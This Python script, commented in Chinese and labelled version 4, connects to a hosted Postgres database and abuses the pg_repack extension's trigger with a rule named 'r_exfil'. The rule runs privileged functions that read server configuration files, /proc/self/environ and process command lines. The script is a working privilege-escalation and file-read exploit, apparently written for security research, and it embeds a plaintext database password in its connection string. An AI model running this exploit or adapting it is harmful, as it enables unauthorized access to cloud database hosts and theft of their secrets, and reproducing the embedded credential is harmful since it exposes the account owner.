# -*- coding: utf-8 -*-
"""v4:修 DROP RULE bug + 高价值配置文件读取(脱敏) + environ hex + /proc cmdline
载体:RULE(完整 SQL) 以 cloud_admin 执行内置函数"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

# --- 搭建 ---
q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int, v text)", fetch=False)
q("CREATE TABLE k_out(x text, b bytea)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

def set_rule_text(expr):
    q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
    r = q("CREATE RULE r_exfil AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_out(x) SELECT %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)
    return r

def set_rule_bytes(expr):
    q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
    r = q("CREATE RULE r_exfil AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_out(b) SELECT %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)
    return r

def fire():
    return q("INSERT INTO k_src VALUES (1,'x')", fetch=False)

def get_text():
    rows = q("SELECT x FROM k_out WHERE x IS NOT NULL")
    return [r[0] for r in rows] if rows else None

def get_bytes():
    rows = q("SELECT b FROM k_out WHERE b IS NOT NULL LIMIT 1")
    return bytes(rows[0][0]) if rows else None

def redact(s, keep=200):
    """脱敏:截断 + 掩蔽常见秘密模式"""
    import re
    s2 = re.sub(r'(?i)(token|secret|key|password|passwd|credential|api[_-]?key|authorization)\s*[=:]\s*\S+', lambda m: m.group(1) + '=***REDACTED***', s)
    return s2[:keep] if len(s2) > keep else s2

# --- [1] 配置文件批量读 ---
print('=== [1] $PGDATA 高价值文件 ===')
files = ['postmaster.opts', 'compute_ctl_temp_override.conf', 'postgresql.auto.conf', 'pg_hba.conf', 'postmaster.pid']
for f in files:
    r = set_rule_text("pg_read_file(current_setting('data_directory') || '/%s')" % f)
    fire()
    t = get_text()
    if t is not None:
        print('--- %s ---' % f)
        print(redact(t[0], 900))
    else:
        print('%s: no rows / err %s' % (f, r))

# --- [2] environ hex 复查 ---
print('=== [2] environ hex 前 200 字节 ===')
r = set_rule_bytes("pg_read_binary_file('/proc/self/environ')")
fire()
b = get_bytes()
if b:
    print('len:', len(b))
    print('hex:', b[:200].hex())
    # 尝试按 \x00 分后直接 utf-8 解码看可打印部分
    import string
    printable = ''.join(chr(c) if c in range(32, 127) or c in (9, 10, 13) else '.' for c in b)
    print('ascii:', printable[:400])
else:
    print('no rows:', r)

# --- [3] /proc 进程 cmdline(找 compute_ctl/communicator 等) ---
print('=== [3] /proc pid 列表 ===')
r = set_rule_text("pg_ls_dir('/proc')")
fire()
pids = get_text()
pids = [p for p in pids if p.isdigit()] if pids else []
print('pids:', pids)

def read_cmdline(pid):
    r = set_rule_bytes("pg_read_binary_file('/proc/%s/cmdline')" % pid)
    fire()
    b = get_bytes()
    return b, r

print('--- 各进程 cmdline(脱敏) ---')
for pid in pids:
    b, r = read_cmdline(pid)
    if b:
        args = b.replace(b'\x00', b' ').decode('utf-8', 'replace')
        print('  pid %s: %s' % (pid, redact(args, 400)))
    else:
        print('  pid %s: (unreadable %s)' % (pid, r[:80]))

# --- 清理 ---
q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
conn.close()
